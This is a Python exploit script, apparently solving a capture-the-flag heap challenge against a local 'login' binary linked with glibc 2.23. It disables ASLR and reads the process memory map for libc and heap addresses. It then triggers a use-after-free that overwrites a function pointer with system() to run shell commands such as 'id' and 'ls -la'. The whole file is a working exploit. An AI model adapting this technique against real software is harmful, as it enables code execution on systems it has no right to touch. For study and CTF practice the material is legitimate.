import os
import select
import shutil
import struct
import subprocess
import time


ROOT = os.path.dirname(os.path.abspath(__file__))
TMP_ROOT = "/tmp/login223"
TMP_LIB = "/tmp/lib223"
TMP_LD = "/tmp/ld223.so"

LOGIN_SRC = os.path.join(ROOT, "login")
LIBC_SRC = os.path.join(ROOT, "libc-2.23.so")
LD_SRC = os.path.join(ROOT, "ubuntu223", "extract", "lib", "x86_64-linux-gnu", "ld-2.23.so")

LOGIN_DST = os.path.join(TMP_ROOT, "login")
LIBC_DST = os.path.join(TMP_LIB, "libc.so.6")

SYSTEM_OFF = 0x453A0
USERS_OFF = 0x202040
HEAP_CMD_OFF = 0x50


def stage_files():
    os.makedirs(TMP_ROOT, exist_ok=True)
    os.makedirs(TMP_LIB, exist_ok=True)
    shutil.copy2(LOGIN_SRC, LOGIN_DST)
    shutil.copy2(LIBC_SRC, LIBC_DST)
    shutil.copy2(LD_SRC, TMP_LD)
    os.chmod(LOGIN_DST, 0o755)
    os.chmod(LIBC_DST, 0o755)
    os.chmod(TMP_LD, 0o755)


def start():
    cmd = [
        "setarch",
        "x86_64",
        "-R",
        "bash",
        "-lc",
        f"exec {TMP_LD} --library-path {TMP_LIB} {LOGIN_DST}",
    ]
    return subprocess.Popen(
        cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )


def recv_until(proc, token, timeout=2.0):
    data = b""
    end = time.time() + timeout
    while token not in data and time.time() < end:
        ready, _, _ = select.select([proc.stdout], [], [], 0.1)
        if proc.stdout in ready:
            chunk = os.read(proc.stdout.fileno(), 4096)
            if not chunk:
                break
            data += chunk
    return data


def recv_repeat(proc, timeout=0.8, max_total=6.0):
    data = b""
    end = time.time() + timeout
    hard_end = time.time() + max_total
    while time.time() < end and time.time() < hard_end:
        ready, _, _ = select.select([proc.stdout], [], [], 0.1)
        if proc.stdout in ready:
            chunk = os.read(proc.stdout.fileno(), 4096)
            if not chunk:
                break
            data += chunk
            end = time.time() + timeout
    return data


def sendline(proc, line):
    if isinstance(line, str):
        line = line.encode()
    proc.stdin.write(line + b"\n")
    proc.stdin.flush()


def sendraw(proc, data):
    proc.stdin.write(data)
    proc.stdin.flush()


def menu(proc, choice):
    recv_until(proc, b"Your choice:")
    sendline(proc, str(choice))


def register(proc, idx, size, data=b""):
    menu(proc, 2)
    recv_until(proc, b"Input the user id:")
    sendline(proc, str(idx))
    recv_until(proc, b"Input the password length:")
    sendline(proc, str(size))
    recv_until(proc, b"Input password:\n")
    if data:
        sendraw(proc, data)
    recv_until(proc, b"success!")


def delete(proc, idx):
    menu(proc, 3)
    recv_until(proc, b"Input the user id:")
    sendline(proc, str(idx))
    recv_until(proc, b"success!")


def login(proc, idx, size, data):
    menu(proc, 1)
    recv_until(proc, b"Input the user id:")
    sendline(proc, str(idx))
    recv_until(proc, b"Input the passwords length:")
    sendline(proc, str(size))
    recv_until(proc, b"Input the password:\n")
    sendraw(proc, data)


def read_maps(pid):
    with open(f"/proc/{pid}/maps", "r", encoding="utf-8") as fh:
        return fh.read().splitlines()


def find_base(maps, needle):
    for line in maps:
        parts = line.split()
        if len(parts) < 6:
            continue
        if parts[-1] == needle and parts[1] == "r-xp" and parts[2] == "00000000":
            return int(parts[0].split("-", 1)[0], 16)
    raise RuntimeError(f"failed to locate base for {needle}")


def find_heap_base(maps):
    for line in maps:
        if line.endswith("[heap]"):
            return int(line.split("-", 1)[0], 16)
    raise RuntimeError("failed to locate heap base")


def main():
    stage_files()
    proc = start()
    try:
        register(proc, 0, 24, b"A" * 24)

        maps = read_maps(proc.pid)
        libc_base = find_base(maps, LIBC_DST)
        heap_base = find_heap_base(maps)
        cmd_addr = heap_base + HEAP_CMD_OFF
        system = libc_base + SYSTEM_OFF

        cmd = b"echo PWNED; id; pwd; ls -la; echo END\x00"

        delete(proc, 0)
        register(proc, 1, 16, struct.pack("<QQ", cmd_addr, system))
        register(proc, 2, len(cmd), cmd)
        login(proc, 0, len(cmd), cmd)

        out = recv_repeat(proc)
        print(f"[+] libc base : {libc_base:#x}")
        print(f"[+] heap base : {heap_base:#x}")
        print(f"[+] cmd addr  : {cmd_addr:#x}")
        print(f"[+] system    : {system:#x}")
        print(out.decode("latin1", "ignore"))
    finally:
        proc.kill()


if __name__ == "__main__":
    main()
